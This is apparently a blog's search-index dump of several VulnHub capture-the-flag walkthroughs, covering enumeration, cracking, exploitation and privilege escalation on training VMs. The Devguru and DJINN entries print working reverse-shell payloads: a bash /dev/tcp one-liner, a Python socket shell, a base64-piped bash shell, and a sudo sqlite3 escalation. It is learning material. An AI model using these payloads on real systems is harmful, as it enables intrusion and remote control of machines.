Scan â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled.png)Lets scan it with all ports flag `-p-` â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%201.png)**As I know that after solving the straylight I can go for Neuromancer Machine And As I have found this in root section of Straylight :>******![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%202.png)Now lets navigate to `/struts2_2.3.15.1-showcase` â¤µï¸![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%203.png)I got command injection code for jsp file and Executed it on Web Interface and I got this â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%204.png)Now I know that â†’![Untitled](/Vulnhub-Files/img/Neuromancer/Untitled%205.png)Full Discloser â†’[https://jckhmr.net/wintermute-part-2-neuromancer-vulnhub-writeup/](https://jckhmr.net/wintermute-part-2-neuromancer-vulnhub-writeup/)---### **Use âž¡ï¸**ðŸ’¡ **chisel tool****for piviting between the systems (Neuromance , Straylight , Kali)**- List> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Load of the Root : 1.0.1", "url": "/posts/Load/", "categories": "VulnHub", "tags": "PrivEsc, Recon, Kernel Exploit, mysql", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>[!Info] ðŸ’¡ [Lord Of The Root: 1.0.1](https://vulnhub.com/entry/lord-of-the-root-101,129/) â†’> > I created this machine to help others learn some basic CTF hacking strategies and...", "content": "## **Description â¤µï¸**>[!Info] ðŸ’¡ [Lord Of The Root: 1.0.1](https://vulnhub.com/entry/lord-of-the-root-101,129/) â†’> > I created this machine to help others learn some basic CTF hacking strategies and some tools. I aimed this machine to be very similar in difficulty to those I was breaking on the OSCP.> > This is a boot-to-root machine will not require any guest interaction.> > There are two designed methods for privilege escalation.> - 23/09/2015 == v1.0.1> > - 22/09/2015 == v1.0> > > > If you are having issues with VirtualBox, try the following:> > - Downloaded LordOfTheRoot_1.0.1.ova (confirmed file hash)> > - Downloaded and installed VMWare ovftool.> > - Converted the OVA to OVF using ovftool.> > - Modified the OVF using text editor, and did the following:> > replaced all references to \"ElementName\" with \"Caption\" replaced the single reference to \"vmware.sata.ahci\" with \"AHCI\"> > - Saved the OVF. +Deleted the .mf (Manifest) file. If you do not you get an error when importing, saying the SHA does not match for the OVF (I also tried modifying the hash, but no luck).> > - Try import the OVF file, and it should work fine.> > Source: https://twitter.com/dooktwit/status/646840273482330112{: .prompt-info }### **Letâ€™s find the IP Address first >>**![103-1.png](/Vulnhub-Files/img/Load_of_the_root/103-1.png)```bashIP : 10.0.2.23```{: .nolineno}## Port Scan Results âž¡ï¸![104-2.png](/Vulnhub-Files/img/Load_of_the_root/104-2.png)![104-1.png](/Vulnhub-Files/img/Load_of_the_root/104-1.png)```bashOPEN PORTS >22 SSH1337 HTTP```{: .nolineno}---## Web Enumeration â¤µï¸I first enumerated port 1337 where I found a image, After checking its source code I discover a directory name `/iwilldoit/`.![105-1.png](/Vulnhub-Files/img/Load_of_the_root/105-1.png)I again check the source code of this directory `/iwilldoit/` and found an interesting comment that need to be checked in. ![105-2.png](/Vulnhub-Files/img/Load_of_the_root/105-2.png)![105-3.png](/Vulnhub-Files/img/Load_of_the_root/105-3.png)```bashTHprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh```{: .nolineno}I used https://hashes.com to crack it down.![105-4.png](/Vulnhub-Files/img/Load_of_the_root/105-4.png)```bashCloser!```{: .nolineno}![105-5.png](/Vulnhub-Files/img/Load_of_the_root/105-5.png)Another file path I found while digging into other images and with `exiftool` I got the hint.![105-6.png](/Vulnhub-Files/img/Load_of_the_root/105-6.png)Sqlmap â†’```bashcommands â†’sqlmap -o -u http://10.0.2.23:1337/978345210/index.php --form --dbs --l```{: .nolineno}![105-7.png](/Vulnhub-Files/img/Load_of_the_root/105-7.png)![105-8.png](/Vulnhub-Files/img/Load_of_the_root/105-8.png)```bashCommand â†’ sqlmap -o -u http://10.0.2.23:1337/978345210/index.php --form --dbms m```{: .nolineno}![105-9.png](/Vulnhub-Files/img/Load_of_the_root/105-9.png)| id | password | username || --- | ---------------- | -------- || 1 | iwilltakethering | frodo || 2 | MyPreciousR00t | smeagol || 3 | AndMySword | aragorn || 4 | AndMyBow | legolas || 5 | AndMyAxe | gimli |Now lets try SSH login with user `MyPreciousR00t` â†’![106-1.png](/Vulnhub-Files/img/Load_of_the_root/106-1.png)Now lets check the kernel version â†’![106-2.png](/Vulnhub-Files/img/Load_of_the_root/106-2.png)I found on web , rather I could also use kernel exploits like [DirtyCow](https://github.com/evait-security/ClickNRoot/tree/master/1) / [PwnKit](https://github.com/ly4k/PwnKit) for post exploitation.![106-3.png](/Vulnhub-Files/img/Load_of_the_root/106-3.png)I used `searchsploit` Tool that will search the exploit from public exploitdb repository about the exploit.![106-4.png](/Vulnhub-Files/img/Load_of_the_root/106-4.png)Let is try it out â†’I got it â†’![106-5.png](/Vulnhub-Files/img/Load_of_the_root/106-5.png)Flag.txt â†’![106-6.png](/Vulnhub-Files/img/Load_of_the_root/106-6.png)# **Summery Notes â†’**> ðŸ’¡ > sqlmap>> Post Exploitation can also be done through [DirtyCow](https://github.com/evait-security/ClickNRoot/tree/master/1) / [PwnKit](https://github.com/ly4k/PwnKit) exploits.{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "InfoSec Prep OSCP", "url": "/posts/Infosec_prep_OSCP/", "categories": "VulnHub", "tags": "PrivEsc, Recon, SUIDs, Wordpress", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [InfoSec Prep: OSCP](https://vulnhub.com/entry/infosec-prep-oscp,508/) â¤µï¸>>This box should be **easy**. This machine was created for the InfoSec Prep Discord Server ([https:...", "content": "## **Description â¤µï¸**>ðŸ’¡ [InfoSec Prep: OSCP](https://vulnhub.com/entry/infosec-prep-oscp,508/) â¤µï¸>>This box should be **easy**. This machine was created for the InfoSec Prep Discord Server ([https://discord.gg/RRgKaep](https://discord.gg/RRgKaep)) as a give way for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.>>The box was created with *VMWare Workstation*, but it should work with VMWare Player and Virtualbox. Upon booting up it should display an IP address. This is the target address based on whatever settings you have. You should verify the address just incase.>>Find the ***flag.txt*** in **/root/** and submit it to the TryHarder bot on Discord to enter the give away. The command is only available for so long. So if you are just joining the server or doing the box for fun, the command would not be there any longer at a later time.>>Please do not publish any write ups for this box until August 7, 2020 as this is probably when the give away will end. After that, fair game!>>A big thanks to Offensive Security for providing the OSCP voucher.>>Box created by FalconSpy with the support of the staff at InfoSec Prep Discord Server>>This works better with VirtualBox rather than VMware. >\\## Changelog 2020/07/10 - v1.0.1 - Fixed IP issue 2020/07/11 - v1.0.0{: .prompt-info }### **Letâ€™s find the IP Address first >>**![77-1.png](/Vulnhub-Files/img/Infosec_prep_OSCP/77-1.png)```bashIP : 10.0.2.20```{: .nolineno}## Port Scan Results âž¡ï¸![89-1.png](/Vulnhub-Files/img/Infosec_prep_OSCP/89-1.png)![89-2.png](/Vulnhub-Files/img/Infosec_prep_OSCP/89-2.png)```bashOPEN PORTS >22 SSH80 HTTP33060 mysql```{: .nolineno}---## Web Enumeration â¤µï¸![90-1.png](/Vulnhub-Files/img/Infosec_prep_OSCP/90-1.png)![90-2.png](/Vulnhub-Files/img/Infosec_prep_OSCP/90-2.png)![90-3.png](/Vulnhub-Files/img/Infosec_prep_OSCP/90-3.png)This is base64 lets see what it says â†’I get a private key â†’![90-4.png](/Vulnhub-Files/img/Infosec_prep_OSCP/90-4.png)Now lets try Shell with this private key â†’```bashCommands â†’ ssh oscp@10.0.2.21 -i private_key_openssl```{: .nolineno}![91-1.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-1.png)I checked the configuration file of the wordpress site that is `wp-config.php` file.![91-2.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-2.png)```bashwordpress : Oscp12345!```{: .nolineno}Lets check the mysql database from the victim machine and look for some interesting data.![91-3.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-3.png)As found in SGID â†’![91-4.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-4.png)As I got bash as SUID permission so it is easier said then done to be a root now that will allow me to have `EUID(Effective User Identity) as 0` you can check with `id` command that makes me root privileged user.![91-5.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-5.png)![91-6.png](/Vulnhub-Files/img/Infosec_prep_OSCP/91-6.png)```bashflag.txt â†’ d73b04b0e696b0945283defa3eee4538```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Hack Me Please : 1", "url": "/posts/Hack/", "categories": "VulnHub", "tags": "CMS, PrivEsc, Public Exploit, Recon, mysql, Seeddms", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [Hack Me Please: 1](https://vulnhub.com/entry/hack-me-please-1,731/) âž¡ï¸>>**Difficulty:** Easy>>**Description:** An easy box totally made for OSCP. No bruteforce is required....", "content": "## **Description â¤µï¸**>ðŸ’¡ [Hack Me Please: 1](https://vulnhub.com/entry/hack-me-please-1,731/) âž¡ï¸>>**Difficulty:** Easy>>**Description:** An easy box totally made for OSCP. No bruteforce is required.>>**Aim:** To get root shell{: .prompt-info }### **Letâ€™s find the IP Address first >>**![136-1.png](/Vulnhub-Files/img/Hack_me_please/136-1.png)```bashIP : 10.0.2.27```{: .nolineno}## Port Scan Results âž¡ï¸![137-1.png](/Vulnhub-Files/img/Hack_me_please/137-1.png)![137-2.png](/Vulnhub-Files/img/Hack_me_please/137-2.png)![137-3.png](/Vulnhub-Files/img/Hack_me_please/137-3.png)```bashOPEN PORTS >80 HTTP3306 mysql33060 mysqlx```{: .nolineno}___## Web Enumeration â¤µï¸![138-1.png](/Vulnhub-Files/img/Hack_me_please/138-1.png)I did directory listing with `Feroxbuster` Tool.![138-2.png](/Vulnhub-Files/img/Hack_me_please/138-2.png)While checking the source code of `/js/main.js` file, I got a hint for a directory.![138-3.png](/Vulnhub-Files/img/Hack_me_please/138-3.png)`/seeddms51x/seeddms-5.1.22/`With `hid & try` method I used `seeddms` as username & password â†’![138-4.png](/Vulnhub-Files/img/Hack_me_please/138-4.png)![138-5.png](/Vulnhub-Files/img/Hack_me_please/138-5.png)| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd || ----------- | ------------------- | ------------------ | --------------- || 1 | saket | saurav | Saket@#$1337 |![138-6.png](/Vulnhub-Files/img/Hack_me_please/138-6.png)I was now able to crack the password So I changed it â†’ `to admin`![138-7.png](/Vulnhub-Files/img/Hack_me_please/138-7.png)![138-8.png](/Vulnhub-Files/img/Hack_me_please/138-8.png)Now the updates credentials are â†’![138-9.png](/Vulnhub-Files/img/Hack_me_please/138-9.png)Lets try it now â†’![138-10.png](/Vulnhub-Files/img/Hack_me_please/138-10.png)I got the access â†’![138-11.png](/Vulnhub-Files/img/Hack_me_please/138-11.png)Added the reverse shell â†’![138-12.png](/Vulnhub-Files/img/Hack_me_please/138-12.png)Now it is time to load the shell file â†’![138-13.png](/Vulnhub-Files/img/Hack_me_please/138-13.png)![138-14.png](/Vulnhub-Files/img/Hack_me_please/138-14.png)![139-1.png](/Vulnhub-Files/img/Hack_me_please/139-1.png)![139-2.png](/Vulnhub-Files/img/Hack_me_please/139-2.png)![139-3.png](/Vulnhub-Files/img/Hack_me_please/139-3.png)**ROOT !!**# **Summery Notes â†’**> ðŸ’¡> 1. Tricky part was to find the `/js/main.js` file . After that the path becomes very easy .> 2. And also the updation of password was new for me .> 3. rest all was very easy peasy ..{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "GoldenEye", "url": "/posts/GoldenEye/", "categories": "VulnHub", "tags": "POP3, Password Bruteforce, PrivEsc, Kernel Exploit, moodle", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [GoldenEye](https://vulnhub.com/entry/goldeneye-1,240/) â¤µï¸>>I recently got done creating an OSCP type vulnerable machine that is themed after the great James Bond film (and ...", "content": "## **Description â¤µï¸**>ðŸ’¡ [GoldenEye](https://vulnhub.com/entry/goldeneye-1,240/) â¤µï¸>>I recently got done creating an OSCP type vulnerable machine that is themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get root and capture the secret GoldenEye codes - flag.txt.>>I'd rate it as Intermediate, it has a good variety of techniques needed to get root - no exploit development/buffer overflows. After completing the OSCP I think this would be a great one to practice on, plus there is a hint of CTF flavor.>>I've created and validated on VMware and VirtualBox. You would not need any extra tools other than what is on Kali by default. Will need to be setup as Host-Only, and on VMware you may need to click \"retry\" if prompted, upon initially starting it up because of formatting.>> Changelog Beta - 2018-05-02 v1 - 2018-05-04{: .prompt-info }### **Letâ€™s find the IP Address first >>**![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled.png)```bashIP : 10.0.2.20```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%201.png)![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%202.png)```bashOPEN PORTS >25 smtp80 http55006 pop355007 POP3```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%203.png)Lets check the source code â†’![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%204.png)After Cracking it I got password for boris â†’```bashboris : InvincibleHack3r```{: .nolineno}After login I got this â†’On checking Source code I got this â†’![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%205.png)![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%206.png)I have tried `pop3` with these credentials but no luck so lets brute fore the password for pop3 login with these users â†’`hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 10.0.2.20 -s 55007 pop3`![Untitled](/Vulnhub-Files/img/GoldenEye/Untitled%207.png)```bashboris : secret1!```{: .nolineno}Lets check the pop3 service now and see what we can â†’![79-6.png](/Vulnhub-Files/img/GoldenEye/79-6.png)![79-7.png](/Vulnhub-Files/img/GoldenEye/79-7.png)![79-8.png](/Vulnhub-Files/img/GoldenEye/79-8.png)![79-8.png](/Vulnhub-Files/img/GoldenEye/79-8%201.png)![79-9.png](/Vulnhub-Files/img/GoldenEye/79-9.png)Now lets check the password for `natalya` user â†’![79-10.png](/Vulnhub-Files/img/GoldenEye/79-10.png)```bashnatalya : bird```{: .nolineno}Lets try it out â†’![79-11.png](/Vulnhub-Files/img/GoldenEye/79-11.png)![79-12.png](/Vulnhub-Files/img/GoldenEye/79-12.png)```bashusername: xeniapassword: RCP90rulez!```{: .nolineno}â†’ **severnaya-station.com in `/etc/hosts`.**![79-13.png](/Vulnhub-Files/img/GoldenEye/79-13.png)![79-14.png](/Vulnhub-Files/img/GoldenEye/79-14.png)![79-15.png](/Vulnhub-Files/img/GoldenEye/79-15.png)Lets see the password for this user like that â†’![79-16.png](/Vulnhub-Files/img/GoldenEye/79-16.png)```bashdoak : goat```{: .nolineno}![79-17.png](/Vulnhub-Files/img/GoldenEye/79-17.png)```bashusername: dr_doakpassword: 4England!```{: .nolineno}After login I got this file â†’![79-18.png](/Vulnhub-Files/img/GoldenEye/79-18.png)![79-19.png](/Vulnhub-Files/img/GoldenEye/79-19.png)![79-20.png](/Vulnhub-Files/img/GoldenEye/79-20.png)![79-21.png](/Vulnhub-Files/img/GoldenEye/79-21.png)```bashadmin : xWinter1995x!```{: .nolineno}Here I will be using metasploit to exploit this vulnerable moodle spelling site.![79-22.png](/Vulnhub-Files/img/GoldenEye/79-22.png)Here I have to enable `pSpellShell` option and save it to get the spell checking exploit work.![79-23.png](/Vulnhub-Files/img/GoldenEye/79-23.png)Now included the python reverse shell â†’![79-25.png](/Vulnhub-Files/img/GoldenEye/79-25.png)Now I get the reverse shell â†’As my shell called by the spell checker function â†’![80-1.png](/Vulnhub-Files/img/GoldenEye/80-1.png)![80-2.png](/Vulnhub-Files/img/GoldenEye/80-2.png)Here the OS is very outdated so lets find an exploit for it â†’![80-3.png](/Vulnhub-Files/img/GoldenEye/80-3.png)Since gcc is not present in the victim machine so I replaced it with cc which used to run in the time of UNIX systems.Now After transferring the exploit to victim machine lets exploit it â†’![80-4.png](/Vulnhub-Files/img/GoldenEye/80-4.png)![80-5.png](/Vulnhub-Files/img/GoldenEye/80-5.png)![80-6.png](/Vulnhub-Files/img/GoldenEye/80-6.png)```bashflag.txt â†’ 568628e0d993b1973adc718237da6e93```{: .nolineno}![80-7.png](/Vulnhub-Files/img/GoldenEye/80-7.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "EVM : 1", "url": "/posts/EVM_1/", "categories": "VulnHub", "tags": "Wordpress, Password Bruteforce, PrivEsc, Public Exploit, Metasploit", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**ðŸ’¡ [EVM_1](https://www.vulnhub.com/entry/evm-1,391/)- This is super friendly box intended for Beginner is- This works better with VirtualBox rather than VMware### Letâ€™s find the...", "content": "## **Description â¤µï¸**ðŸ’¡ [EVM_1](https://www.vulnhub.com/entry/evm-1,391/)- This is super friendly box intended for Beginner is- This works better with VirtualBox rather than VMware### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/EVM_1/Untitled.png)```bashIP : 10.0.2.13```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%201.png)![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%202.png)```bashOPEN PORTS >22 SSH53 ISC server80 HTTP110 POP3139 SAMBA143 IMAP445 SAMBA```{: .nolineno}---## Web Enumeration â¤µï¸Lets see the directory or files bruteforcing through `feroxbuster` and `ffuf` Toolsâ†’![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%203.png)![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%204.png)#### Wpscan Tool Result â†’![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%205.png)```textuser â†’ c0rrupt3d_brain```{: .nolineno}![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%206.png)![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%207.png)```bashLogin Credentials â†’ c0rrupt3d_brain â†’ 24992499```{: .nolineno}Now let is login into the wordpress â†’Through metasploit because we have credentials â†’So let is generate a shell â†’![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%208.png)![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%209.png)Now I have root user password â†’ ![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%2010.png)Now lets log into the root shell â†’![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%2011.png)Proof.txt â†’![Untitled](/Vulnhub-Files/img/EVM_1/Untitled%2012.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Devguru", "url": "/posts/Devguru/", "categories": "VulnHub", "tags": "CMS, PrivEsc, Public Exploit, git, gitea, Password Generate, sudo exploit, OCTOBER CMS", "date": "2023-06-11 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root...", "content": "Description â¤µï¸ ðŸ’¡ DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root. OSCP like ~ Real life based Difficulty: Intermediate (Depends on experience)Letâ€™s find the IP Address firstÂ Â»IP : 10.0.2.26Port Scan Results âž¡ï¸OPEN PORTS &gt;22 SSH80 HTTP8585 unknownWeb Enumeration â¤µï¸I checked port 80 and I got this static webpage.After that I checked port 8585 and I got a gitea page, whose version is Gitea Version 1.12.5.Now lets look into the directory or files bruteforcing from feroxbuster and ffuf Tool â†’I also looked into searchsploit for anyt public exploit for this gitea version.Since it needs Authentication So I Have to find the username and the password to get the access â†’Lets use nikto also â†’Since I have gitea that also means that I would also have .git directory as that can I also be seen in nikto Tool scan above so lets take a look into it.Now we have .git as a directory so its time to extract some git directories with the help of git-dumper â†’Now lets recon further â†’Data â†’ /git-dump/config/databases.php â†’'database' =&gt; 'octoberdb','username' =&gt; 'october','password' =&gt; 'SQ66EBYx4GT3byXH'While opening the git-dump directory I found â†’ adminer.php â†’I used this above info to login into the phpmyadmin site like this.After using that credentials I got this â†’I then cracked this password hash with is in bcrypt from online random site and I did not able to crack it.Now As I have access to the database to lets change the password hash according to my password and I will be using password as password here from http://brypt-generator.com site â†’ Lets replace the password and saving it,Now I can Logged in with frank â†’ password cred.Now coming back the main site lets login with frank â†’ password cred and I can see OCTOBER CMS.I got a reverse shell for october cms â†’When I saved the code I loaded the site and I got this â†’After some enumeration I found this â†’ on /var/backups/app.ini.bak â†’Now I have the credentials of gitea for mysql services lets use it similar as we did before â†’username â†’ giteapassword â†’ UfFPTF8C8jjxVF2mwith this I got in â†’Now lets use that exploit â†’The Exploit was not working so lets use the mannual code execution â†’Now lets edit and commit any file so I choose README.md file â†’Now I got it â†’user.txt â†’ 22854d0aec6ba776f9d35bf7b0e00217Now lets check the *sudo -l* further and I got this â†’lets use it â†’command â†’`sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash`root.txt â†’ 96440606fb88aa7497cde5a8e68daf8fSummery Notes â†’ Git enumeration with git-dumper and executing the reverse shell was on good path. I enjoyed the swaping of the password method from mysql . I got to know about october CMS and its reverse shell code . Also about the sudo vulnerability part â†october CMS reverse shell code â€“&gt;function onstart(){ exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/4444 0&gt;&amp;1'\");}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'root â†’sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash -i' If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "DJINN", "url": "/posts/DJINN/", "categories": "VulnHub", "tags": "FTP, Command Injection, PrivEsc, Python Compiled (.pyc)", "date": "2023-06-11 00:00:00 +0530", "snippet": "## Description â¤µï¸ðŸ’¡ [DJINN](https://www.vulnhub.com/entry/djinn-1,397/)- Level: Beginner-Intermediate- flags: user.txt and root.txt- Description: The machine is VirtualBox as well as VMWare compatib...", "content": "## Description â¤µï¸ðŸ’¡ [DJINN](https://www.vulnhub.com/entry/djinn-1,397/)- Level: Beginner-Intermediate- flags: user.txt and root.txt- Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You'll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.- Format: Virtual Machine (Virtualbox - OVA)- Operating System: Linux### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/DJINN/Untitled.png)```bashIP : 10.0.2.12```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/DJINN/Untitled%201.png)![Untitled](/Vulnhub-Files/img/DJINN/Untitled%202.png)```bashOPEN PORTS >21 FTP (Anonymous Login Allowed)22 filtered ssh (Means there is a way to open this may be through knocking ports)1337 waste ? [I have to check it through netcat]7331 http (may be vulnerable)```{: .nolineno}---## FTP Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/DJINN/Untitled%203.png)Lets see what I got from FTP server.![Untitled](/Vulnhub-Files/img/DJINN/Untitled%204.png)## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/DJINN/Untitled%205.png)![Untitled](/Vulnhub-Files/img/DJINN/Untitled%206.png)After Executing `id` command I got this, `Command Injection` working properly â†’![Untitled](/Vulnhub-Files/img/DJINN/Untitled%207.png)Now after doing so many hardwork, I got to know that for achieving reverse shell I need to decode the encoded code inside the Execute command â†’ After so much of hardwork I got to know that base 64 encoded code is executing which decoding it inside the command injection : â†’```bashpayload â†’bash -i >& /dev/tcp/10.0.2.10/4444 0>&1Execute â†’echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTAvNDQ0NCAwPiYxCg==\" | base64 -d | bash```{: .nolineno}Now in return I got this â†’![Untitled](/Vulnhub-Files/img/DJINN/Untitled%208.png)After some enumeration I got another cred like this :![Untitled](/Vulnhub-Files/img/DJINN/Untitled%209.png)```bashnitish:p4ssw0rdStr3r0n9```{: .nolineno}![Untitled](/Vulnhub-Files/img/DJINN/Untitled%2010.png)```bashuser.txt â†’ 10aay8289ptgguy1pvfa73alzusyyx3c```{: .nolineno}![Untitled](/Vulnhub-Files/img/DJINN/Untitled%2011.png)Now lets exploit â†’![Untitled](/Vulnhub-Files/img/DJINN/Untitled%2012.png)Lets see how sam can lead us to sam â†’![Untitled](/Vulnhub-Files/img/DJINN/Untitled%2013.png)I got `.pyc` file in `/home/sam/.pyc` After transferring to attackers machine when I opened it I got to know this part â†’```pythondef guessit():\t\tnum = randint(1, 101)\t\tprint(\"Choose a number between 1 to 100: \")\t\ttry:\t\t s = input(\"Enter your number: \")\t\t if s == num: # Summery Notes â†’> These are the important commands, I used above.> `bash -i >& /dev/tcp/10.0.2.10/4444 0>&1` > `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTAvNDQ0NCAwPiYxCg== | base64 -d | bash` > `sudo -u sam /usr/bin/genie -cmd whoami` > `eval ('__import__(\"os\").system(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTAvNDQ0NCAwPiYxCg== | base64 -d | bash\")')`{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DERPNSTINK 1", "url": "/posts/DERPNSTINK/", "categories": "VulnHub", "tags": "Wordpress, OSINT, mysql, Wireshark, PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ **DIFFICULTY â†’** [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/)>>**Level** : **Beginner**>>ABOUT â†’>>Mr. Derp and Uncle Stinky are two system administrators wh...", "content": "## **Description â¤µï¸**>ðŸ’¡ **DIFFICULTY â†’** [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/)>>**Level** : **Beginner**>>ABOUT â†’>>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...>>INSTRUCTIONS â†’>>This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!>>Your goal is to remotely attack the VM and>>find all 4 flags eventually leading you to full root access.>>Do not forget to #tryharder>>Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.>>CONTACT â†’>>Hit me up if you enjoy this VM! Twitter: @securekomodo Email:Â hackerbryan@protonmail.com{: .prompt-info }#### **Letâ€™s find the IP Address first >>**![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled.png)```bashIP : 10.0.2.14```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%201.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%202.png)```bashOPEN PORTS >21 FTP (Check for Anonymous Login)22 SSH (Not seams vulnerable)80 HTTP (Time to dig into this !)```{: .nolineno}---## Web Enumeration â¤µï¸I checked the port 80 :![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%203.png)set the `/etc/hosts` as 10.0.2.14 [derpnstink.local](https://derpnstink.local/) â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%204.png)Lets use wpscan results â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%205.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%206.png)Then lets find the username and password â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%207.png)Through enumeration I got this â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%209.png)```bashFlag 1 â†’ flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)```{: .nolineno}![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2010.png)It time to upload our payload â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2011.png)I used this payload since the supports jpeg or I can also try to upload the php file like above.![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%208.png)Finally got the reverse shell â†’ ![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2012.png)As I got a Local Privilege Escalation â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2013.png)lets see this one â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2014.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2015.png)Lets check the database now â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2016.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2017.png)```bashunclestinky```{: .nolineno}![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2018.png)Lets identify the hash â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2019.png)This result is from [hashes.com](https://hashes.com/) â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2020.png)```bashunclestinky â†’ 